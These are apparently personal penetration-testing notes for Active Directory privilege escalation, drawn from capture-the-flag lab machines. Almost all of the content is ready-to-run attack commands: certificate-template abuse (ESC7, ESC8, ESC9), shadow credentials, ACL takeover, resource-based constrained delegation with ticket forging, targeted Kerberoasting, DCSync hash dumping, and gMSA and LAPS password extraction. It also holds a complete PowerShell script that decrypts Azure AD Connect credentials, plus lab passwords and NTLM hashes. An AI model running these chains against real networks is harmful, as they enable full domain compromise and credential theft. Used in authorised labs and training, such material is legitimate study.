#### AD CS
- upload Certify.exe
```
./certify.exe find /vulnerable
```
- Template Name: UserAuthentication
- msPKI-Certificate-Name-Flag: ENROLLE SUPPLIES SUBJECT
- Permissions: Enrollment Rights includes Domain Users
	- must be logged in as domain user
```
./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```
- should return RSA Private Key and Certificate
	- copy/paste into file on kali named "cert.pem"
- on kali run:
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- password is blank
- then run:
```
certipy auth -pfx cert.pfx -dc-ip 10.129.121.20 -username Administrator -domain sequel.htb
```
- should return administrator ntlm hash
	- if not, run:
		- `ntpdate 10.129.121.20`
			- may need to run multiple times, until "no skew", but might work with just "no leap"; keep trying and running certipy command right after

Can also run ADCS remotely with certipy
```
certipy find -dc-ip 10.129.42.194 -ns 10.129.42.194 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
- bottom of output will list vulnerabilities like ESC7
##### ESC7:
```
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
- adds user Raven to group that can manage CA permissions
```
certipy find -dc-ip 10.129.42.194 -ns 10.129.42.194 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
- same command as above, run to confirm user was added to group successfully (look at ManageCertificates row for user added)
```
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
- command is supposed to fail, but saves private key (hit `y`)
```
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
- should successfully issue certificate
	- if it fails go back to previous command to add Raven to group (as this resets)
```
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
- retrieves the issued certificate and saves as administrator.pfx
```
certipy auth -pfx administrator.pfx -dc-ip manager.htb
```
- should give hash for administrator for pass-the-hash (use part after the colon)
	- if nameserver error, try replacing `manager.htb` with ip of machine
- if clockskew error, run:
```
sudo ntpdate 10.129.42.194
```
- should sync time to machine, then run prior command
- may take multiple attempts


##### ESC4

##### ESC8 (Shadow Credentials)
Find user with WriteOwner & WriteDACL permissions (in Cert Publishers group for example)
- upload Certify.exe to target machine as any user and run:
```
./Certify.exe find /domain:sequel.htb
```
![[Pasted image 20250320090619.png]]
- Find template that lists users with `WriteOwner` and `WriteDacl` permissions that you control
	- `SUBJECT_ALT_REQUIRE_DNS` prevents using a user UPN, need to remove
	- `ENROLLEE_SUPPLIES_SUBJECT` is missing and needs to be added
	- Use these [[AD#If user (ryan) has writeOwner permissions over another user (ca_svc), run these commands in fast sequence|steps]] to gain control of user within a group listed in template that you have writeOwner privs over and get hash used below
- In example below, found template named DunderMifflinAuthentication and ca_svc is a member of Cert Publishers so inherits group permissions
```
KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
```
![[Pasted image 20250320090923.png]]
```
certipy req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
```
![[Pasted image 20250320091237.png]]
```
certipy auth -pfx administrator_10.pfx -domain sequel.htb -dc-ip 10.10.11.51 -debug
```
![[Pasted image 20250320091306.png]]
```
evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

#### ESC9
conditions:
- StrongCertificateBindingEnforcement not set to 2 (default: 1) or CertificateMappingMethods contains UPN flag
- Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value
- Certificate specifies any client authentication EKU
- attacker must have access to an account that has GenericWrite over the other account
```
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
```
![[Pasted image 20250324201041.png]]
- abusing management_svc's GenericAll over ca_operator to change userPrincipalName of ca_operator to be Administrator
```
certipy req -u ca_operator -hashes :259745cb123a52aa2e693aaacca2db52 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
```
![[Pasted image 20250324201145.png]]
- request certificate as ca_operator using the vulnerable template
- may need to try multiple times
```
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
```
![[Pasted image 20250324201255.png]]
- changing ca_operator UPN back to what it was
```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
```
![[Pasted image 20250324201400.png]]
- keep syncing clock until it works
---
### Permission abuse
##### If user (ryan) has writeOwner permissions over another user (ca_svc), run these commands in fast sequence to get hash:
```
bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
```
```
dacledit.py  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
```
```
sudo ntpdate sequel.htb
```
```
certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
```
![[Pasted image 20250320091606.png]]
- sets ryan as owner of ca_svc
- once owner, 2nd command gives ryan full control of ca_svc
- syncs time
- should return hash for ca_svc

##### If user (judith) has WriteOwner permissions over a group (management), which has GenericWrite over management_svc user:
```
bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 set owner "CN=Management,CN=Users,DC=certified,DC=htb" "CN=Judith Mader,CN=Users,DC=certified,DC=htb"
```
![[Pasted image 20250324194118.png]]
- set judith as owner of management group
```
python3 dacledit.py -dc-ip 10.129.239.104 -u certified.htb/judith.mader:judith09 -target-dn "CN=Management,CN=Users,DC=certified,DC=htb" -principal-dn "CN=Judith Mader,CN=Users,DC=certified,DC=htb" -action write -rights WriteMembers
```
![[Pasted image 20250324194201.png]]
- give judith WriteMember permissions over management group
```
bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 add groupMember "CN=Management,CN=Users,DC=certified,DC=htb" "CN=Judith Mader,CN=Users,DC=certified,DC=htb"
```
![[Pasted image 20250324194402.png]]
- add judith to management group
```
bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 get object "CN=Management,CN=Users,DC=certified,DC=htb"
```
![[Pasted image 20250324194426.png]]
- verify judith successfully added to management group
```
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
```
- retrieve hash for management_svc
- can also use pywhisker instead:
```
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```
![[Pasted image 20250324195017.png]]
```
openssl pkcs12 -export -out management_svc_cert.pfx -inkey management_svc_cert.pem_priv.pem -in management_svc_cert.pem_cert.pem -nodes -password pass:
```
![[Pasted image 20250324195057.png]]
```
certipy auth -pfx management_svc_cert.pfx -u management_svc -domain certified.htb -dc-ip 10.129.239.104 -debug
```
![[Pasted image 20250324195151.png]]
```
sudo systemctl stop systemd-timesyncd
```
- disables ntp from overriding my time sync
```
sudo ntpdate -u 10.129.239.104
```
- sets ntp to sync with DC-01 target server

##### If user (Olivia) has GenericAll permissions over another user (Michael)
```
net user Michael Password123
```
- Change benjamin's password if currently owned user has GenericAll over benjamin
	- then login as that user and spray all open services with new creds
- can also use bloodyAD ForceChangePassword command below (if no shell)
- if neither of those work, try certipy to get hash:
```
certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
```
![[Pasted image 20250324195505.png]]
- using management_svc's GenericAll over ca_operator to write shadow credentials and get the NTLM hash of ca_operator
- if that doesn't work, try running `certipy find` on the account you are targeting even with wrong password:
```
certipy find -dc-ip 10.10.11.41 -ns 10.10.11.41 -u ca_operator@certified.htb -p '12345678' -vulnerable -stdout
```
![[Pasted image 20250324200006.png]]
![[Pasted image 20250324200016.png]]
- shows vulnerable to [[AD#ESC9]]
- 
#### If user (Michael) has ForceChangePassword over another user (Benjamin)
```
bloodyAD -u "Michael" -p "Password123" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
```
- using succesfully authenticated creds of michael to reset Benjamin's password
#### If user (Emily) has GenericWrite permissions over another user (Ethan)
- make sure IP is in `/etc/hosts` with all subdomains
```
sudo ntpdate administrator.htb
```
- syncs timezone for kerberos
- may need to run multiple times if below command fails:
```
targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
```
- running this command with Emily will display the hash for Ethan
	- run john to crack the hash, then use pw below for secretsdump command
#### If user (Ethan) has DCsync over domain (dc.administrator.htb)
```
secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
```


---

##### RBCD (Resource Based Constrained Delegation) Attack
- automatic script from https://github.com/tothi/rbcd-attack and this blog https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28: 
```
sudo python3 /opt/rbcd-attack/rbcd.py -dc-ip 192.168.167.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
```
Manual method:
- - Requirements:
	- `SeMachineAccountPrivilege` shows enabled
		- `whoami /priv` to check current user
	- `Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota`
		- shows quota, must be more than 0, default is 10
		- `. .\PowerView.ps1` required for commands
	- must be 2012+ DC
		- `Get-DomainController | select name,osversion | fl`
	- `msds-allowedtoactonbehalfofotheridentity` must be empty
		- `Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl`
```
New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)
```
- create fake computer
- requires `. .\Powermad.ps1`
```
$fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
```
- save SID as variable
	- check it saved with `$fakesid` command
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```
- creating ACL step 1: command creates raw security descriptor $SD with specific access control entries
```
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```
- creating ACL step 2: creates new byte array $SDBytes with length equal to binary length of security descriptor
```
$SD.GetBinaryForm($SDBytes, 0)
```
- creating ACL step 3: converts $SD into binary form and stores in the byte array
```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
- creating ACL step 4: applies security descriptor to the `msds-allowedtoactonbehalfofotheridentity` attribute of the target computer object
	- check it worked:
		- `$RawBytes = Get-DomainComputer 0xdfFakeComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
		- `$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0`
		- `$Descriptor.DiscretionaryAcl`
			- will display `AccessAllowed` under AceType if worked
```
.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
```
- get hash of fake computer account labeled rc4_mac and put into next command:
```
.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```
- last base64 ticket listed should be for administrator
	- copy and save it to kali without spaces as `ticket.kirbi.b64`
on kali:
```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```
- base64 decode and save as ticket.kirbi
```
ticketConverter.py ticket.kirbi ticket.ccache
```
- save ticket in cacheable format
```
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```
- saves ticket in cash and get shell as administrator

---

***ReadGMSAPassword privilege in Bloodhound***
can confirm account is a service account with GMSA enabled
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
```
- Will list service accounts and ObjectClass will say msDS-GroupmanageServiceAccount if GMSA is enabled
get more insight into the group that manages this service account, import PowerView.ps1, then run:
```
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
```
- will show service account/user `svc_apache` and the groups that have this permission under `PrincipalsAllowedToDelegateToAccount` with CN=
	- check who's a member of that group with 
```
Get-ADGroupMember 'Web Admins'
```
extract hash from user listed (need shell as another user and upload tool):
```
.\GMSAPasswordReader.exe --accountname svc_apache$
```
- current value rc4_mac is the NT hash
extract hash from user's listed in above command (need creds)
```
python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
```
forge ticket from delegated service, pass ticket from previous command:
```
getST.py -dc-ip 10.129.227.54 -spn www/dc.intelligence.htb -hashes :51e4932f13712047027300f869d07ab6 -impersonate administrator intelligence.htb/svc_int
```
shell via cached ticket (caches automatically from previous command):
```
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```
- make sure `dc.intelligence.htb` is added to `/etc/host` before running

DC Sync Attack  ^8bdeef
- requirements: user creds with DCSync privileges
```
secretsdump.py -just-dc egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround\!@10.129.102.130
```
- will return admin hash
	- take part of hash after `:` and pass-the-hash with `-H` via `nxc` or `evil-winrm`
Can create new user to perform DC Sync if needed:
- `. .\PowerView.ps1`
- `net user zeus password /add /domain`
- `net users /domain`
	- make sure zeus is listed
- `net group "Exchange Windows Permissions" /add zeus`
	- adding zeus to group with DCSync privileges
- `net user zeus`
	- make sure group is listed
- `$pass = convertto-securestring 'password' -AsPlainText -Force`
- `New-Object System.Management.Automation.PSCredential('htb\zeus', $pass)`
- `Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zeus -Rights DCSync`
	- if fails, re-import PowerView.ps1
- run `secretsdump.py` command above from kali


Azure Connect abuse ^b9f60c
- requires creds to a user with Azure Admins group membership
```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
- save as .ps1 (currently saved in ~/HTB/monteverde/poc.ps1) and upload to shell and run `.\poc.ps1` to get administrator password


LAPS
see *ReadLAPSPassword* in bloodhound but no foothold/shell, use nxc:
```
nxc ldap 192.168.199.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.199.122 -M laps
```

`net user svc_deploy` shows "LAPS_Readers" or something similar to imply LAPS is happening
```
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```
- ms-mcs-admpwd property shows the local admin password for the box
- `evil-winrm -i 10.129.98.245 -S -u administrator -p 'l2H.h7Ao4m04tk7z+0v5LB.['`
	- root flag will actually be in a different static directory on the box instead of admin because the admin user wont have a static password to confirm flag

